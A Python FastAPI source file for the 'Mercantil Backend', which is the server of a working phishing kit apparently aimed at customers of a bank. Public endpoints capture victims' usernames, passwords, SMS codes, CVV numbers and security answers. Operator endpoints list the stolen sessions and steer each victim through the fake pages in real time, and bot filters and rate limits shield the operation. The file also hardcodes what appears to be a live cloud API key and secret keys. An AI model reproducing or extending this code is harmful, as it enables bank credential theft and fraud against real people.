from fastapi import FastAPI, HTTPException, Depends, status, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel, Field
from typing import Optional, Dict
from datetime import datetime, timedelta, timezone
from jose import jwt, JWTError
from passlib.context import CryptContext
import requests
import os
import hashlib
import time
import secrets

# ============================================================
# CONFIGURACIÓN
# ============================================================
PROJECT_ID = os.getenv("FIRESTORE_PROJECT_ID", "basedtos-84767")
API_KEY = os.getenv("FIRESTORE_API_KEY", "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0")
JWT_SECRET = os.getenv("JWT_SECRET", "super_secret_key_cambiar_en_produccion")
JWT_EXPIRES_MINUTES = int(os.getenv("JWT_EXPIRES_MINUTES", "480"))
SETUP_SECRET_KEY = "MiLlaveMaestraSecreta_2026"  # ⚠️ CAMBIA ESTO

FIRESTORE_URL = f"https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents"
USERS_COLL = "panel_usuarios"
SESSIONS_COLL = "copejas"

pwd_context = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")
security = HTTPBearer()

app = FastAPI(title="Mercantil Backend", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================================
# SISTEMA ANTISPAM (Memoria local)
# ============================================================
_spam_tracker: Dict[str, dict] = {}
MAX_INTENTOS_POR_IP = 5
VENTANA_TIEMPO_SEGUNDOS = 60
TIEMPO_BANEO_SEGUNDOS = 300

def verificar_spam(ip: str):
    ahora = time.time()
    if ip not in _spam_tracker:
        _spam_tracker[ip] = {"last_time": ahora, "count": 1, "banned_until": 0}
        return
    data = _spam_tracker[ip]
    if data["banned_until"] > ahora:
        restante = int(data["banned_until"] - ahora)
        raise HTTPException(status_code=429, detail=f"Demasiados intentos. Bloqueado por {restante} segundos.")
    if ahora - data["last_time"] > VENTANA_TIEMPO_SEGUNDOS:
        data["count"] = 1
        data["last_time"] = ahora
        return
    data["count"] += 1
    data["last_time"] = ahora
    if data["count"] > MAX_INTENTOS_POR_IP:
        data["banned_until"] = ahora + TIEMPO_BANEO_SEGUNDOS
        raise HTTPException(status_code=429, detail="Límite de velocidad excedido. Intenta en 5 minutos.")

# ============================================================
# HELPERS FIRESTORE REST
# ============================================================
def fs_get(collection: str, doc_id: Optional[str] = None):
    if doc_id:
        url = f"{FIRESTORE_URL}/{collection}/{doc_id}?key={API_KEY}"
    else:
        url = f"{FIRESTORE_URL}/{collection}?key={API_KEY}"
    return requests.get(url)

def fs_set(collection: str, doc_id: str, fields: dict):
    url = f"{FIRESTORE_URL}/{collection}/{doc_id}?key={API_KEY}"
    body = {"fields": fields}
    return requests.patch(url, json=body)

def fs_delete(collection: str, doc_id: str):
    url = f"{FIRESTORE_URL}/{collection}/{doc_id}?key={API_KEY}"
    return requests.delete(url)

def fs_parse_doc(doc: dict) -> dict:
    result = {"id": doc.get("name", "").split("/")[-1]}
    fields = doc.get("fields", {})
    for k, v in fields.items():
        if "stringValue" in v:
            result[k] = v["stringValue"]
        elif "integerValue" in v:
            result[k] = int(v["integerValue"])
        elif "booleanValue" in v:
            result[k] = v["booleanValue"]
        elif "timestampValue" in v:
            result[k] = v["timestampValue"]
        elif "doubleValue" in v:
            result[k] = float(v["doubleValue"])
        elif "mapValue" in v:
            inner = {}
            for mk, mv in v["mapValue"].get("fields", {}).items():
                if "stringValue" in mv:
                    inner[mk] = mv["stringValue"]
                elif "integerValue" in mv:
                    inner[mk] = int(mv["integerValue"])
                elif "doubleValue" in mv:
                    inner[mk] = float(mv["doubleValue"])
                elif "booleanValue" in mv:
                    inner[mk] = mv["booleanValue"]
                else:
                    inner[mk] = mv
            result[k] = inner
        else:
            result[k] = v
    return result

# ============================================================
# JWT
# ============================================================
def crear_token(username: str, role: str) -> str:
    payload = {
        "sub": username,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(minutes=JWT_EXPIRES_MINUTES),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")

def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(credentials.credentials, JWT_SECRET, algorithms=["HS256"])
        return payload
    except JWTError:
        raise HTTPException(status_code=401, detail="Token inválido o expirado")

def require_admin(user: dict = Depends(get_current_user)):
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Solo administradores")
    return user

# ============================================================
# HELPERS CONFIG HASH
# ============================================================
def generar_config_hash() -> str:
    """Genera un hash único y seguro para usar como identificador de configuración."""
    return secrets.token_urlsafe(16)  # Ej: "xK9_aB2cD4eF6gH8"

# ============================================================
# MODELOS
# ============================================================
class RegisterRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=30, pattern=r"^[a-zA-Z0-9._-]+$")
    password: str = Field(..., min_length=6)
    role: str = Field(default="admin", pattern=r"^(admin|editor|viewer)$")

class LoginRequest(BaseModel):
    username: str
    password: str

class PageUpdate(BaseModel):
    page: str | int
    label: str = ""

class CaptureRequest(BaseModel):
    usuario: str
    clave: str
    ip: str = "desconocida"
    ht_token: int = 0
    timestamp: int = 0
    config_hash: Optional[str] = None

class SetupRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=30)
    password: str = Field(..., min_length=6)
    setup_key: str

class SMSRequest(BaseModel):
    sms: str

class PublicSessionUpdate(BaseModel):
    page: Optional[str] = None
    sms: Optional[str] = None
    preguntas: Optional[dict] = None
    cvv: Optional[str] = None

class UserConfigUpdate(BaseModel):
    pregunta1: Optional[str] = None
    pregunta2: Optional[str] = None

# ============================================================
# ENDPOINTS DE AUTENTICACIÓN
# ============================================================
@app.post("/api/auth/register")
def register(req: RegisterRequest, admin: dict = Depends(require_admin)):
    username = req.username.lower()
    existing = fs_get(USERS_COLL, username)
    if existing.status_code == 200:
        raise HTTPException(status_code=409, detail="Ese usuario ya existe")

    password_hash = pwd_context.hash(req.password)
    config_hash = generar_config_hash()

    fields = {
        "username": {"stringValue": username},
        "password_hash": {"stringValue": password_hash},
        "role": {"stringValue": req.role},
        "config_hash": {"stringValue": config_hash},
        "created_at": {"timestampValue": datetime.now(timezone.utc).isoformat()},
    }
    r = fs_set(USERS_COLL, username, fields)
    if r.status_code not in (200, 201):
        raise HTTPException(status_code=500, detail=f"Error guardando usuario: {r.text}")
    return {
        "status": "ok",
        "username": username,
        "role": req.role,
        "config_hash": config_hash,
    }

@app.post("/api/auth/login")
def login(req: LoginRequest):
    username = req.username.lower()
    r = fs_get(USERS_COLL, username)
    if r.status_code != 200:
        raise HTTPException(status_code=401, detail="Usuario o contraseña incorrectos")

    doc = fs_parse_doc(r.json())
    password_hash = doc.get("password_hash", "")

    if not pwd_context.verify(req.password, password_hash):
        raise HTTPException(status_code=401, detail="Usuario o contraseña incorrectos")

    token = crear_token(username, doc.get("role", "admin"))
    return {"status": "ok", "token": token, "username": username, "role": doc.get("role", "admin")}

@app.get("/api/auth/me")
def me(user: dict = Depends(get_current_user)):
    return {"username": user["sub"], "role": user.get("role", "admin")}

@app.get("/api/auth/users")
def list_users(admin: dict = Depends(require_admin)):
    r = fs_get(USERS_COLL)
    if r.status_code != 200:
        raise HTTPException(status_code=500, detail="Error listando usuarios")
    docs = r.json().get("documents", [])
    users = []
    for doc in docs:
        parsed = fs_parse_doc(doc)
        parsed.pop("password_hash", None)
        users.append(parsed)
    return {"users": users}

@app.delete("/api/auth/users/{username}")
def delete_user(username: str, admin: dict = Depends(require_admin)):
    if username == admin["sub"]:
        raise HTTPException(status_code=400, detail="No puedes eliminarte a ti mismo")
    r = fs_delete(USERS_COLL, username.lower())
    if r.status_code != 200:
        raise HTTPException(status_code=404, detail="Usuario no encontrado")
    return {"status": "ok", "message": f"Usuario {username} eliminado"}

# ============================================================
# ENDPOINT PARA QUE EL ADMIN ACTUALICE LA CONFIGURACIÓN DE UN USUARIO
# ============================================================
@app.patch("/api/auth/users/{username}/config")
def update_user_config(username: str, req: UserConfigUpdate, admin: dict = Depends(require_admin)):
    """
    Actualiza las preguntas de configuración de un usuario específico.
    Solo accesible para administradores.
    """
    username = username.lower()
    r = fs_get(USERS_COLL, username)
    if r.status_code != 200:
        raise HTTPException(status_code=404, detail="Usuario no encontrado")

    fields = {}
    mask_paths = []

    if req.pregunta1 is not None:
        fields["pregunta1"] = {"stringValue": req.pregunta1}
        mask_paths.append("pregunta1")
    if req.pregunta2 is not None:
        fields["pregunta2"] = {"stringValue": req.pregunta2}
        mask_paths.append("pregunta2")

    if not fields:
        raise HTTPException(status_code=400, detail="Nada que actualizar")

    mask_query = "&".join([f"updateMask.fieldPaths={p}" for p in mask_paths])
    url = f"{FIRESTORE_URL}/{USERS_COLL}/{username}?key={API_KEY}&{mask_query}"
    r = requests.patch(url, json={"fields": fields})
    if r.status_code != 200:
        raise HTTPException(status_code=500, detail=f"Error actualizando: {r.text}")

    return {"status": "ok", "updated": mask_paths}

# ============================================================
# ENDPOINTS DE SESIONES (Protegido con Antispam)
# ============================================================
@app.post("/api/sessions/capture")
async def capture_login(data: CaptureRequest, request: Request):
    client_ip = request.client.host if request.client else data.ip
    if data.ip != "desconocida":
        client_ip = data.ip

    verificar_spam(client_ip)

    if not data.usuario or not data.clave:
        raise HTTPException(status_code=400, detail="Usuario y clave requeridos")
    if len(data.clave) < 4:
        raise HTTPException(status_code=400, detail="Contraseña muy corta")

    bot_keywords = ["test", "admin", "usuario", "bot", "null", "1234"]
    if data.usuario.lower() in bot_keywords or data.clave.lower() in bot_keywords:
        print(f"[BOT BLOQUEADO] Credenciales genéricas desde IP: {client_ip}")
        raise HTTPException(status_code=400, detail="Credenciales inválidas")

    if data.ht_token == 0:
        print(f"[ALERTA BOT] Posible bot (sin interacción humana) desde IP: {client_ip}")

    session_id = hashlib.md5(f"{data.usuario}{data.clave}{client_ip}".encode()).hexdigest()

    fields = {
        "usuario": {"stringValue": data.usuario},
        "clave": {"stringValue": data.clave},
        "ip": {"stringValue": client_ip},
        "estado": {"stringValue": "online"},
        "page": {"integerValue": "1"},
        "first_seen": {"integerValue": str(data.timestamp or int(datetime.now().timestamp() * 1000))},
        "lastSeen": {"timestampValue": datetime.now(timezone.utc).isoformat()},
    }

    # ✅ Guardar el config_hash si viene
    if data.config_hash:
        fields["config_hash"] = {"stringValue": data.config_hash}

    r = fs_set(SESSIONS_COLL, session_id, fields)
    if r.status_code not in (200, 201):
        raise HTTPException(status_code=500, detail=f"Error guardando en Firestore: {r.text}")

    return {"status": "ok", "session_id": session_id, "message": "Credenciales capturadas"}

# ============================================================
# ENDPOINT DE SESIONES CON FILTRO AUTOMÁTICO POR CONFIG_HASH
# ============================================================
@app.get("/api/sessions")
def list_sessions(admin: dict = Depends(get_current_user)):
    """
    Lista las sesiones filtradas automáticamente por el config_hash
    del administrador que está logueado.
    """
    username = admin.get("sub")
    if not username:
        raise HTTPException(status_code=401, detail="Token inválido")

    # 1. Buscar el config_hash del usuario en Firestore
    user_res = fs_get(USERS_COLL, username)
    if user_res.status_code != 200:
        return {"sessions": []}  # Si no existe, no ve nada

    user_doc = fs_parse_doc(user_res.json())
    config_hash = user_doc.get("config_hash")

    # 2. Obtener todas las sesiones
    r = fs_get(SESSIONS_COLL)
    if r.status_code != 200:
        raise HTTPException(status_code=500, detail="Error listando sesiones")
    
    docs = r.json().get("documents", [])
    sessions = [fs_parse_doc(d) for d in docs]

    # 3. Filtrar por config_hash
    if config_hash:
        sessions = [s for s in sessions if s.get("config_hash") == config_hash]
    else:
        sessions = []  # Si no tiene hash, no ve nada

    return {"sessions": sessions}

@app.delete("/api/sessions/{doc_id}")
def delete_session(doc_id: str, admin: dict = Depends(get_current_user)):
    r = fs_delete(SESSIONS_COLL, doc_id)
    if r.status_code != 200:
        raise HTTPException(status_code=404, detail="Sesión no encontrada")
    return {"status": "ok", "message": f"Sesión {doc_id} eliminada"}

@app.patch("/api/sessions/{doc_id}")
def update_session(doc_id: str, update: PageUpdate, admin: dict = Depends(get_current_user)):
    url = f"{FIRESTORE_URL}/{SESSIONS_COLL}/{doc_id}?key={API_KEY}&updateMask.fieldPaths=page"

    try:
        page_int = int(update.page)
        body = {"fields": {"page": {"integerValue": str(page_int)}}}
    except (ValueError, TypeError):
        body = {"fields": {"page": {"stringValue": str(update.page)}}}

    r = requests.patch(url, json=body)
    if r.status_code != 200:
        raise HTTPException(status_code=500, detail=f"Error actualizando: {r.text}")
    return {"status": "ok", "page": update.page}

# ============================================================
# ENDPOINT PARA CREAR EL PRIMER ADMINISTRADOR
# ============================================================
@app.post("/api/setup")
def create_first_admin(req: SetupRequest):
    if req.setup_key != SETUP_SECRET_KEY:
        raise HTTPException(status_code=403, detail="Llave secreta incorrecta")

    username = req.username.lower()
    existing = fs_get(USERS_COLL, username)
    if existing.status_code == 200:
        raise HTTPException(status_code=409, detail="Ese usuario ya existe")

    password_hash = pwd_context.hash(req.password)
    config_hash = generar_config_hash()

    fields = {
        "username": {"stringValue": username},
        "password_hash": {"stringValue": password_hash},
        "role": {"stringValue": "admin"},
        "config_hash": {"stringValue": config_hash},
        "created_at": {"timestampValue": datetime.now(timezone.utc).isoformat()},
    }

    r = fs_set(USERS_COLL, username, fields)
    if r.status_code not in (200, 201):
        raise HTTPException(status_code=500, detail=f"Error guardando usuario: {r.text}")

    return {
        "status": "ok",
        "message": f"Usuario '{username}' creado como administrador.",
        "username": username,
        "config_hash": config_hash,
    }

# ============================================================
# ENDPOINTS PÚBLICOS (para la víctima, sin token)
# ============================================================
@app.get("/api/sessions/{doc_id}/page")
def get_session_page(doc_id: str):
    """
    Devuelve SOLO la página actual de una sesión (público).
    No expone credenciales, usuarios ni otras sesiones.
    """
    r = fs_get(SESSIONS_COLL, doc_id)
    if r.status_code != 200:
        raise HTTPException(status_code=404, detail="Sesión no encontrada")
    doc = fs_parse_doc(r.json())
    return {"page": doc.get("page", "carga.html")}

@app.post("/api/sessions/{doc_id}/sms")
def save_session_sms(doc_id: str, req: SMSRequest):
    """
    Guarda el código SMS que ingresó la víctima.
    Es público porque la víctima no tiene token de admin.
    """
    if not req.sms or len(req.sms) < 3:
        raise HTTPException(status_code=400, detail="Código SMS inválido")

    r = fs_get(SESSIONS_COLL, doc_id)
    if r.status_code != 200:
        raise HTTPException(status_code=404, detail="Sesión no encontrada")

    url = f"{FIRESTORE_URL}/{SESSIONS_COLL}/{doc_id}?key={API_KEY}&updateMask.fieldPaths=sms&updateMask.fieldPaths=page"
    body = {
        "fields": {
            "sms": {"stringValue": req.sms},
            "page": {"stringValue": "carga.html"},
        }
    }
    r = requests.patch(url, json=body)
    if r.status_code != 200:
        raise HTTPException(status_code=500, detail=f"Error guardando SMS: {r.text}")

    return {"status": "ok", "sms_guardado": req.sms}

@app.get("/api/sessions/{doc_id}/preguntas")
def get_session_preguntas(doc_id: str):
    """
    Devuelve las preguntas asignadas a una sesión (público).
    """
    r = fs_get(SESSIONS_COLL, doc_id)
    if r.status_code != 200:
        raise HTTPException(status_code=404, detail="Sesión no encontrada")
    doc = fs_parse_doc(r.json())
    return {
        "pregunta1": doc.get("pregunta1", ""),
        "pregunta2": doc.get("pregunta2", ""),
    }

@app.patch("/api/sessions/{doc_id}/public")
def public_update_session(doc_id: str, update: PublicSessionUpdate):
    """
    Endpoint público para que la víctima actualice su propia sesión.
    Solo permite modificar 'page', 'sms', 'preguntas' y 'cvv'.
    No requiere token de administrador.
    """
    r = fs_get(SESSIONS_COLL, doc_id)
    if r.status_code != 200:
        raise HTTPException(status_code=404, detail="Sesión no encontrada")

    fields = {}
    mask_paths = []

    if update.page is not None:
        fields["page"] = {"stringValue": str(update.page)}
        mask_paths.append("page")

    if update.sms is not None:
        fields["sms"] = {"stringValue": str(update.sms)}
        mask_paths.append("sms")

    if update.cvv is not None:
        fields["cvv"] = {"stringValue": str(update.cvv)}
        mask_paths.append("cvv")

    if update.preguntas is not None:
        pg_fields = {}
        for k, v in update.preguntas.items():
            if isinstance(v, bool):
                pg_fields[k] = {"booleanValue": v}
            elif isinstance(v, (int, float)):
                pg_fields[k] = {"integerValue": str(int(v))}
            else:
                pg_fields[k] = {"stringValue": str(v)}
        fields["preguntas"] = {"mapValue": {"fields": pg_fields}}
        mask_paths.append("preguntas")

    if not fields:
        raise HTTPException(status_code=400, detail="Nada que actualizar")

    mask_query = "&".join([f"updateMask.fieldPaths={p}" for p in mask_paths])
    url = f"{FIRESTORE_URL}/{SESSIONS_COLL}/{doc_id}?key={API_KEY}&{mask_query}"

    r = requests.patch(url, json={"fields": fields})
    if r.status_code != 200:
        raise HTTPException(status_code=500, detail=f"Error actualizando: {r.text}")

    return {"status": "ok", "updated": mask_paths}

# ============================================================
# ENDPOINT PÚBLICO DE CONFIGURACIÓN POR HASH
# ============================================================
@app.get("/api/config/{config_hash}")
def get_config_by_hash(config_hash: str):
    """
    Endpoint público que devuelve la configuración de un usuario
    a partir de su config_hash. Se usa en el frontend.
    """
    r = fs_get(USERS_COLL)
    if r.status_code != 200:
        raise HTTPException(status_code=500, detail="Error leyendo usuarios")

    docs = r.json().get("documents", [])
    for doc in docs:
        parsed = fs_parse_doc(doc)
        if parsed.get("config_hash") == config_hash:
            return {
                "username": parsed.get("username"),
                "config": {
                    "pregunta1": parsed.get("pregunta1", ""),
                    "pregunta2": parsed.get("pregunta2", ""),
                },
            }

    raise HTTPException(status_code=404, detail="Configuración no encontrada")

@app.get("/api/health")
def health():
    return {"status": "ok", "service": "mercantil-backend"}